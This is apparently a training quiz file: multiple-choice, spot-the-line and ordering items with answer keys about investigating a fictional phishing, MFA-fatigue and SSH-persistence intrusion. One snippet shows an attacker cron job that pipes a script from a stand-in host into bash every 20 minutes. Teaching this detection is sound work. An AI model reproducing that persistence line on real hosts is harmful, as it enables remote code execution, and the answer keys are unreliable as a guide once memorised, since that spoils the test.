@@ -1,0 +1,245 @@
+[
+  {
+    "obj": "1.1",
+    "snippet": "Authentication-Results: mx01.drinalog.example;\n\tspf=pass (sender IP is 198.51.100.61) smtp.mailfrom=mail.drinalog-sso.example;\n\tdkim=pass (2048-bit key) header.d=drinalog-sso.example header.s=s1;\n\tdmarc=fail (p=none dis=none) header.from=drinalog.example\nFrom: \"Drina IT podrska\" <it-podrska@drinalog.example>",
+    "lang": "text",
+    "q": "Based on these headers, why was the phishing email delivered to Jelena's mailbox?",
+    "options": [
+      "SPF and DKIM passed, so the message is legitimate",
+      "DMARC failed because the domains that passed SPF and DKIM are not aligned with the From domain, but the p=none policy requests no action",
+      "The DKIM signature is forged, but mx01 does not check DKIM",
+      "SPF failed, and DMARC ignores SPF when DKIM passes"
+    ],
+    "answer": 1,
+    "explain": "SPF and DKIM passed, but for the attacker's domain drinalog-sso.example. DMARC requires the domain that passed to be aligned with the From domain (drinalog.example), so it fails. Because Drina Logistika publishes p=none, the receiving server only records the failure and delivers the message. With p=quarantine or p=reject it would be quarantined or rejected."
+  },
+  {
+    "obj": "1.1",
+    "type": "spot",
+    "snippet": "Return-Path: <bounce+jkovac=drinalog.example@mail.drinalog-sso.example>\nReceived: from mx01.drinalog.example (localhost [127.0.0.1])\n\tby mbox01.drinalog.example (Postfix) with ESMTP id 7C2E31A0042\nReceived: from mail.drinalog-sso.example (mail.drinalog-sso.example [198.51.100.61])\n\tby mx01.drinalog.example (Postfix) with ESMTPS id 4Hq2Lk0Zc9z9sWX\nFrom: \"Drina IT podrska\" <it-podrska@drinalog.example>\nReply-To: <it-podrska@drinalog-sso.example>\nTo: \"Jelena Kovac\" <jelena.kovac@drinalog.example>\nSubject: Hitno: potvrdite MFA registraciju do 12h\nDate: Tue, 13 Oct 2026 09:42:07 +0200\nX-Mailer: PHPMailer 6.9.1",
+    "lang": "text",
+    "q": "Which lines reveal the attacker's infrastructure, i.e. the real sender domain, even though From looks like an internal address?",
+    "answer": [
+      0,
+      3,
+      6
+    ],
+    "explain": "Return-Path (the envelope sender), the Received header added by our mx01 (the real server 198.51.100.61 named mail.drinalog-sso.example) and Reply-To pointing to drinalog-sso.example reveal the attacker. From is arbitrary text the attacker chooses, and the Received from mx01 to mbox01 is an internal hop."
+  },
+  {
+    "obj": "1.1",
+    "q": "The message has five Received headers. Which one do you trust when looking for the IP address of the server that sent the message?",
+    "options": [
+      "The topmost, because it is the newest",
+      "The bottom one, because it is first in the chain",
+      "The one added by the first server under your control (your MX), because it records the address it received the connection from",
+      "Any of them, because DKIM signs them"
+    ],
+    "answer": 2,
+    "explain": "Each server adds its Received header on top, so they are read from the bottom up. Headers below your MX can be written by the attacker. The header added by your MX contains the IP address the TCP connection really came from. DKIM usually does not sign Received headers."
+  },
+  {
+    "obj": "1.1",
+    "type": "multi",
+    "q": "Which of the following data from the phishing email do you put on the IOC list for blocking and for searching other mailboxes?",
+    "options": [
+      "The IP address 198.51.100.61 from the Received header of your MX",
+      "The domain drinalog-sso.example and the URL from the link's href attribute",
+      "The SHA-256 of the attachment MFA-registracija.htm",
+      "The recipient address jelena.kovac@drinalog.example",
+      "The displayed link text login.microsoftonline.com",
+      "The IP address of your mx01 server"
+    ],
+    "answer": [
+      0,
+      1,
+      2
+    ],
+    "explain": "IOCs are the attacker's artifacts: the IP the message was sent from, the domain and URL the link leads to and the attachment hash. The recipient is the victim, mx01 is your infrastructure, and the displayed link text is Microsoft's legitimate domain: blocking it would cause damage."
+  },
+  {
+    "obj": "1.2",
+    "q": "In SigninLogs you see seven records with ResultType 500121 from the same foreign IP address for one user. What does this reliably tell you?",
+    "options": [
+      "The attacker is guessing the password",
+      "The password was correct, and the second factor failed (the user denied or did not confirm the MFA prompt)",
+      "Conditional Access blocked the sign-in",
+      "The user is locked out because of too many attempts"
+    ],
+    "answer": 1,
+    "explain": "500121 means authentication failed at the strong-factor step. That step is reached only with a correct password, so the first factor is already compromised. A wrong password is 50126, and a Conditional Access block is 53003."
+  },
+  {
+    "obj": "1.2",
+    "type": "spot",
+    "snippet": "TimeGenerated         UserPrincipalName   IPAddress      Location  ResultType\n2026-10-13T06:41:12Z  marko.petrovic      192.0.2.10     RS        0\n2026-10-13T06:54:07Z  milica.savic        192.0.2.10     RS        0\n2026-10-13T07:49:58Z  jelena.kovac        192.0.2.10     RS        0\n2026-10-13T08:11:20Z  jelena.kovac        203.0.113.77   NL        500121\n2026-10-13T08:12:05Z  jelena.kovac        203.0.113.77   NL        0\n2026-10-13T08:40:12Z  jelena.kovac        192.0.2.10     RS        0\n2026-10-13T09:05:33Z  jelena.kovac        203.0.113.77   NL        0",
+    "lang": "log",
+    "q": "Successful sign-ins (ResultType 0) and one failure. Milica was in Munich yesterday. Which lines are successful sign-ins that form impossible travel?",
+    "answer": [
+      5,
+      7
+    ],
+    "explain": "Jelena is in Serbia at 07:49, and at 08:12 and 09:05 she signs in successfully from the Netherlands, with a return to Serbia at 08:40: no trip takes 20 minutes. Line 4 is a failure (500121), not a sign-in. Milica's sign-in from Serbia comes 16 hours after the one from Germany, which is possible."
+  },
+  {
+    "obj": "1.2",
+    "snippet": "SigninLogs\n| where ResultType == 0\n| project TimeGenerated, UserPrincipalName, Location, IPAddress\n| order by UserPrincipalName asc, TimeGenerated asc\n| extend PrevUser = prev(UserPrincipalName), PrevLoc = prev(Location),\n         PrevTime = prev(TimeGenerated)\n| where PrevUser == UserPrincipalName and PrevLoc != Location\n| extend Minutes = datetime_diff('minute', TimeGenerated, PrevTime)\n| where Minutes < 180",
+    "lang": "kql",
+    "q": "What does this query find?",
+    "options": [
+      "Users with more than 180 failed sign-ins",
+      "Consecutive successful sign-ins of the same user from different countries less than 3 hours apart",
+      "All sign-ins from countries the user has not used before",
+      "Sign-ins that lasted longer than 180 minutes"
+    ],
+    "answer": 1,
+    "explain": "Sorting by user and time and then prev() gives the same user's previous sign-in. The filter keeps pairs with a different location, and datetime_diff computes the gap in minutes. This is the basic impossible-travel detection; the result is checked against VPN egress points and known trips."
+  },
+  {
+    "obj": "1.2",
+    "q": "All attacker sign-ins after the first one have the same SessionId and AuthenticationRequirement singleFactorAuthentication. What follows for containment?",
+    "options": [
+      "Resetting the password is enough, because the token depends on the password",
+      "Sessions must be revoked, because the attacker uses the token of an approved session and needs neither the password nor MFA",
+      "MFA should be disabled for the user during the investigation",
+      "Only the OfficeHome application should be blocked"
+    ],
+    "answer": 1,
+    "explain": "The MFA requirement is satisfied by a claim in the existing token, so the attacker works with the session Jelena approved. A password reset does not invalidate issued refresh tokens; revoking sessions (Revoke-MgUserSignInSession) does, together with the password reset and removal of the attacker's MFA method."
+  },
+  {
+    "obj": "1.2",
+    "type": "multi",
+    "q": "How does AiTM phishing (a fake page proxies the real sign-in and steals the session cookie) differ in SigninLogs from MFA fatigue? Select the correct statements.",
+    "options": [
+      "With AiTM there is usually no series of 500121 records, because the user completes MFA on the fake page themselves",
+      "With AiTM the successful MFA sign-in comes from the IP address of the attacker's proxy, not the user's",
+      "With AiTM the same session is then used from another IP address or device",
+      "AiTM cannot bypass any form of MFA",
+      "With MFA fatigue the user never types the password"
+    ],
+    "answer": [
+      0,
+      1,
+      2
+    ],
+    "explain": "The AiTM proxy relays the real sign-in, so the user approves one MFA prompt on the page they see; the sign-in comes from the proxy's address and the stolen cookie is later used elsewhere. AiTM bypasses push and OTP MFA, but not FIDO2/passkeys, which bind the signature to the real domain. With MFA fatigue the attacker already has the password."
+  },
+  {
+    "obj": "1.3",
+    "type": "spot",
+    "snippet": "Oct 12 17:44:03 jump01 sshd[40980]: Accepted publickey for jkovac from 10.8.0.14 port 50877 ssh2: ED25519\nOct 12 17:46:20 jump01 sudo:   jkovac : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/systemctl status nginx\nOct 13 07:20:33 jump01 sshd[47811]: Accepted publickey for mpetrovic from 10.8.0.11 port 53002 ssh2: ED25519\nOct 13 08:24:02 jump01 sshd[48121]: Accepted password for jkovac from 10.8.0.23 port 50122 ssh2\nOct 13 08:24:02 jump01 sshd[48121]: pam_unix(sshd:session): session opened for user jkovac(uid=1003)\nOct 13 08:25:13 jump01 sudo:   jkovac : TTY=pts/1 ; USER=root ; COMMAND=/usr/bin/cat /etc/ssh/sshd_config\nOct 13 08:27:15 jump01 crontab[48190]: (jkovac) REPLACE (jkovac)\nOct 13 08:40:01 jump01 CRON[48402]: pam_unix(cron:session): session opened for user jkovac(uid=1003)",
+    "lang": "log",
+    "q": "An auth.log excerpt from jump01. Jelena normally logs in with a key. Which lines show the attacker's entry and the setup of persistence?",
+    "answer": [
+      3,
+      6
+    ],
+    "explain": "Line 3 is a password login (instead of a key) from the VPN address 10.8.0.23 assigned to the attacker. Line 6 is the replacement of the jkovac crontab. Line 7 is the execution of that cron job (a consequence, not the setup), and line 5 is reconnaissance of the SSH configuration."
+  },
+  {
+    "obj": "1.3",
+    "type": "spot",
+    "snippet": "$ ssh-keygen -lf /home/jkovac/.ssh/authorized_keys\n256 SHA256:cXDy5ky+uyusHslJ8cIsTPAjV7S+t4Khpq0j422hz1E jelena@lap-jk-07 (ED25519)\n3072 SHA256:+SniYO7XFnDEUoBsFfx6wdtZWRD/ODj56IQiE2kBUX0 deploy@build-07 (RSA)\n$ crontab -l -u jkovac\n15 6 * * 1-5 /home/jkovac/bin/rotate-nginx-logs.sh\n*/20 * * * * /bin/bash -c \"curl -fsS http://198.51.100.23/k.sh | bash\" >/dev/null 2>&1\n$ cat /etc/cron.d/backup-logs\n25 6 * * * root /usr/local/bin/arhiviraj-logove.sh >/dev/null 2>&1",
+    "lang": "bash",
+    "q": "Jelena has one key on her laptop and the company has no build server. Which lines are the attacker's persistence?",
+    "answer": [
+      2,
+      5
+    ],
+    "explain": "The key with the comment deploy@build-07 is not in the inventory (the comment is chosen by whoever added the key), and the cron job downloads and runs a script from 198.51.100.23 every 20 minutes. Nginx log rotation and the nightly archiving are legitimate jobs."
+  },
+  {
+    "obj": "1.3",
+    "q": "The attacker's login to db01 looks the same as Jelena's daily work: Accepted publickey for jkovac from 10.20.0.10 with the key jkovac@jump01. Which technique and weakness made this possible?",
+    "options": [
+      "T1110 Brute Force: the attacker guessed the password on db01",
+      "T1552.004 Private Keys: the private key for db01 was stored on jump01, so the attacker used it with the user's rights",
+      "T1068 Exploitation for Privilege Escalation on db01",
+      "T1078 Valid Accounts through a new VPN session directly to db01"
+    ],
+    "answer": 1,
+    "explain": "Whoever has a shell as jkovac on jump01 can read ~/.ssh/id_ed25519. That is why private keys are not kept on a jump host: use ssh -J (ProxyJump), agent forwarding with confirmation or short-lived SSH certificates. Detection relies on context: a login to db01 minutes after a suspicious login to jump01, followed by pg_dump."
+  },
+  {
+    "obj": "1.3",
+    "type": "match",
+    "q": "Match each attack step with its MITRE ATT&CK technique.",
+    "options": [
+      "Seven MFA prompts until the user approves one",
+      "Registering the attacker's Authenticator on Jelena's account",
+      "Signing in to OpenVPN with the stolen account",
+      "A key added to ~/.ssh/authorized_keys",
+      "A curl | bash cron job every 20 minutes"
+    ],
+    "targets": [
+      "T1053.003 Cron",
+      "T1098.004 SSH Authorized Keys",
+      "T1621 MFA Request Generation",
+      "T1133 External Remote Services",
+      "T1098.005 Device Registration"
+    ],
+    "answer": [
+      2,
+      4,
+      3,
+      1,
+      0
+    ],
+    "explain": "MFA fatigue is T1621, registering a device or MFA method is T1098.005, VPN access with a stolen account is T1133, a key in authorized_keys is T1098.004, and the cron job is T1053.003."
+  },
+  {
+    "obj": "1.4",
+    "type": "order",
+    "q": "The attacker has an active session, VPN and a cron job on jump01. Put the containment steps in the correct order.",
+    "options": [
+      "Remove the key from authorized_keys and the cron job on jump01",
+      "Revoke sessions and temporarily block sign-in for the account",
+      "Collect evidence from jump01 (crontab, authorized_keys, .bash_history) with SHA-256",
+      "Rotate the jkovac@jump01 key on all servers",
+      "Reset the password and remove the attacker's MFA method",
+      "Terminate the VPN session and block 203.0.113.77 and 198.51.100.23"
+    ],
+    "answer": [
+      1,
+      4,
+      5,
+      2,
+      0,
+      3
+    ],
+    "explain": "First shut down the access the attacker is using right now: sessions, then the password and their MFA method, then VPN and network addresses. Then collect evidence from the host before changing it, remove the persistence and finally rotate the keys the attacker could have used."
+  },
+  {
+    "obj": "1.4",
+    "q": "The IT manager proposes shutting jump01 down immediately. What do you recommend?",
+    "options": [
+      "Shut it down immediately, because it is the fastest containment",
+      "Isolate jump01 on the network (allow only the SOC), collect volatile evidence and then rebuild it from a clean image",
+      "Leave it running without restrictions to watch the attacker",
+      "Delete the jkovac home directory and continue working"
+    ],
+    "answer": 1,
+    "explain": "Shutting down loses processes, network connections and the contents of /tmp, and leaving it unrestricted gives the attacker time. Isolation stops the attacker and preserves the state for evidence collection in order of volatility. Because the attacker had sudo, the host is rebuilt after the investigation."
+  },
+  {
+    "obj": "1.4",
+    "type": "multi",
+    "q": "Which controls would have prevented or stopped this incident early? Select all that directly break a step in the chain.",
+    "options": [
+      "DMARC p=reject for drinalog.example",
+      "MFA with number matching or FIDO2 keys",
+      "PasswordAuthentication no on jump01",
+      "A longer minimum password length",
+      "An analytics rule: 5 or more 500121 followed by a success from the same IP address",
+      "More frequent rotation of Wazuh logs"
+    ],
+    "answer": [
+      0,
+      1,
+      2,
+      4
+    ],
+    "explain": "DMARC p=reject rejects a message with a spoofed From, number matching or FIDO2 prevents MFA fatigue, disabling SSH passwords prevents entry to jump01 with the stolen password, and the analytics rule would alert 12 minutes before SSH. A longer password does not help when the user types it on a fake page, and log rotation does not affect detection."
+  }
+]
